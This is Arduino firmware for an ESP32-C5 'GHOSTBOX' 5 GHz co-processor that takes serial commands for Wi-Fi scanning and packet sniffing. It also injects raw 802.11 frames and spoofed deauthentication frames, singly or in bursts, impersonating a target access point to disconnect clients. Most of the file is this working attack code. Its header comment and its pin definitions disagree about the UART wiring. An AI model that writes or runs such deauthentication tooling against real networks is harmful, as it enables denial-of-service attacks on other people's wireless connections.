/*
 * ═══════════════════════════════════════════════════════════════════════
 * GHOSTBOX C5 · 5 GHz CO-PROCESSOR FIRMWARE (v2.2 - Arduino IDE)
 * Board : ESP32-C5
 * Wiring : S3 TX43 -> C5 RX(GPIO5) | S3 RX44 <- C5 TX(GPIO4)
 * Baud : 115200 on both ends
 * ═══════════════════════════════════════════════════════════════════════
 */

#include <WiFi.h>
#include "esp_wifi.h"
#include <string.h>

// Physical wiring: C5 GPIO11 (TX) -> S3 GPIO44 (RX)
//                  C5 GPIO12 (RX) <- S3 GPIO43 (TX)
#define C5_UART_RX    12
#define C5_UART_TX    11
#define SERIAL_BAUD   115200

// MUST be UART1 — UART0 shares hardware with USB CDC Serial on ESP32-C5
static HardwareSerial LinkSerial(1);

static volatile bool snifferActive = false;
static uint8_t  currentChannel  = 36;
static uint32_t activeScanSeq   = 0;

typedef struct __attribute__((packed)) {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  destination[6];
    uint8_t  source[6];
    uint8_t  access_point[6];
    uint16_t sequence_number;
    uint16_t reason;
} DeauthFrame;

static bool parseMacStr(const char* str, uint8_t out[6]) {
    unsigned int v[6] = {0};
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
    return true;
}

static bool txDeauthFrame(const uint8_t bssid[6], const uint8_t dst[6], uint16_t reason) {
    DeauthFrame frame;
    memset(&frame, 0, sizeof(frame));
    frame.frame_control   = 0x00C0;
    frame.duration        = 0x013A;
    frame.sequence_number = 0;
    frame.reason          = reason;
    memcpy(frame.source,       bssid, 6);
    memcpy(frame.access_point, bssid, 6);
    memcpy(frame.destination,  dst,   6);
    esp_wifi_set_promiscuous(true);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(DeauthFrame), false);
    if (!snifferActive) esp_wifi_set_promiscuous(false);
    return (err == ESP_OK);
}

void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!snifferActive) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len  = pkt->rx_ctrl.sig_len;
    int rssi = pkt->rx_ctrl.rssi;
    if (len >= 24) {
        char bssid[18];
        snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
                 payload[10], payload[11], payload[12],
                 payload[13], payload[14], payload[15]);
        LinkSerial.printf("+PKT:%d,%d,%d,%d,%s\n", (int)type, rssi, currentChannel, len, bssid);
    }
}

void setup() {
    LinkSerial.setRxBufferSize(8192);
    LinkSerial.begin(SERIAL_BAUD, SERIAL_8N1, C5_UART_RX, C5_UART_TX);
    delay(50);
    // Flush any garbage from the line
    while (LinkSerial.available()) LinkSerial.read();
    Serial.begin(115200);
    delay(100);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    wifi_country_t country;
    memset(&country, 0, sizeof(country));
    strncpy(country.cc, "US", 2);
    country.schan  = 1;
    country.nchan  = 13;
    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&country);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(wifiSnifferCallback);

    LinkSerial.println("+READY:ESP32-C5-5GHZ-COPROCESSOR-v2.2");
    Serial.println("+READY:ESP32-C5-5GHZ-COPROCESSOR-v2.2");
}

void run5GHzScan(uint32_t seqId) {
    activeScanSeq = seqId;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);

    int n = WiFi.scanNetworks(false, true, false, 500);
    LinkSerial.printf("+SCAN_START:%lu,%d\n", seqId, n);
    Serial.printf(    "+SCAN_START:%lu,%d\n", seqId, n);

    int count = 0;
    for (int i = 0; i < n; i++) {
        uint8_t ch = WiFi.channel(i);
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "<hidden>";
        count++;
        LinkSerial.printf("+AP_5G:%lu,%s,%d,%d,%s,%d\n",
                          seqId, ssid.c_str(), ch,
                          WiFi.RSSI(i), WiFi.BSSIDstr(i).c_str(),
                          (int)WiFi.encryptionType(i));
        Serial.printf(    "+AP_5G:%lu,%s,%d,%d,%s,%d\n",
                          seqId, ssid.c_str(), ch,
                          WiFi.RSSI(i), WiFi.BSSIDstr(i).c_str(),
                          (int)WiFi.encryptionType(i));
    }
    LinkSerial.printf("+SCAN_END:%lu,%d\n", seqId, count);
    Serial.printf(    "+SCAN_END:%lu,%d\n", seqId, count);
    WiFi.scanDelete();
}

void parseAndExecuteCommand(const String& cmd) {
    if (cmd == "PING") {
        LinkSerial.println("+PONG:OK");
    }
    else if (cmd.startsWith("SCAN_5G")) {
        uint32_t seq = 0;
        int idx = cmd.indexOf(':');
        if (idx > 0) seq = (uint32_t)cmd.substring(idx + 1).toInt();
        run5GHzScan(seq);
    }
    else if (cmd.startsWith("SET_CH:")) {
        int ch = cmd.substring(7).toInt();
        if (ch >= 36) {
            currentChannel = (uint8_t)ch;
            esp_err_t err = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
            if (err == ESP_OK) LinkSerial.printf("+OK:CH=%d\n", currentChannel);
            else               LinkSerial.printf("-ERR:SET_CH_FAILED:%d\n", err);
        } else {
            LinkSerial.printf("-ERR:NOT_5GHZ_CHANNEL:%d\n", ch);
        }
    }
    else if (cmd == "SNIFF_START") {
        snifferActive = true;
        esp_wifi_set_promiscuous(true);
        LinkSerial.println("+OK:SNIFFER_ON");
    }
    else if (cmd == "SNIFF_STOP") {
        snifferActive = false;
        esp_wifi_set_promiscuous(false);
        LinkSerial.println("+OK:SNIFFER_OFF");
    }
    else if (cmd.startsWith("RAW_TX:")) {
        String hex = cmd.substring(7);
        int hexLen = hex.length();
        if (hexLen > 0 && hexLen % 2 == 0) {
            size_t pktLen = hexLen / 2;
            uint8_t* rawBuf = (uint8_t*)malloc(pktLen);
            if (rawBuf) {
                for (size_t i = 0; i < pktLen; i++) {
                    char b[3] = { hex[i*2], hex[i*2+1], '\0' };
                    rawBuf[i] = (uint8_t)strtol(b, NULL, 16);
                }
                esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, rawBuf, pktLen, false);
                free(rawBuf);
                LinkSerial.printf("+TX_RES:%d\n", (res == ESP_OK ? 1 : 0));
            }
        }
    }
    else if (cmd.startsWith("DEAUTH:")) {
        String payload = cmd.substring(7);
        int sep1 = payload.indexOf(',');
        int sep2 = (sep1 >= 0) ? payload.indexOf(',', sep1 + 1) : -1;
        if (sep1 < 0 || sep2 < 0) {
            LinkSerial.println("-ERR:DEAUTH_MALFORMED");
        } else {
            String bssidStr = payload.substring(0, sep1);
            String dstStr   = payload.substring(sep1 + 1, sep2);
            uint16_t reason = (uint16_t)payload.substring(sep2 + 1).toInt();
            if (reason == 0) reason = 0x0007;
            uint8_t bssid[6], dst[6];
            if (!parseMacStr(bssidStr.c_str(), bssid) || !parseMacStr(dstStr.c_str(), dst)) {
                LinkSerial.println("-ERR:DEAUTH_BAD_MAC");
            } else {
                bool ok = txDeauthFrame(bssid, dst, reason);
                LinkSerial.printf("+DEAUTH_TX:%d\n", ok ? 1 : 0);
            }
        }
    }
    else if (cmd.startsWith("DEAUTH_BURST:")) {
        String payload = cmd.substring(13);
        String parts[4];
        int pIdx = 0, startIdx = 0;
        for (int i = 0; i <= (int)payload.length() && pIdx < 4; i++) {
            if (i == (int)payload.length() || payload[i] == ',') {
                parts[pIdx++] = payload.substring(startIdx, i);
                startIdx = i + 1;
            }
        }
        if (pIdx < 3) {
            LinkSerial.println("-ERR:BURST_MALFORMED");
        } else {
            uint8_t bssid[6], dst[6];
            uint16_t reason = (uint16_t)parts[2].toInt();
            int count = (pIdx >= 4) ? parts[3].toInt() : 10;
            if (count <= 0 || count > 64) count = 10;
            if (reason == 0) reason = 0x0007;
            if (!parseMacStr(parts[0].c_str(), bssid) || !parseMacStr(parts[1].c_str(), dst)) {
                LinkSerial.println("-ERR:BURST_BAD_MAC");
            } else {
                int ok = 0;
                for (int i = 0; i < count; i++) {
                    if (txDeauthFrame(bssid, dst, reason)) ok++;
                    delayMicroseconds(500);
                }
                LinkSerial.printf("+BURST_TX:%d/%d\n", ok, count);
            }
        }
    }
    else {
        LinkSerial.println("-ERR:UNKNOWN_COMMAND");
    }
}

void loop() {
    if (LinkSerial.available()) {
        String line = LinkSerial.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) parseAndExecuteCommand(line);
    }
    if (Serial.available()) {
        String line = Serial.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) parseAndExecuteCommand(line);
    }
}
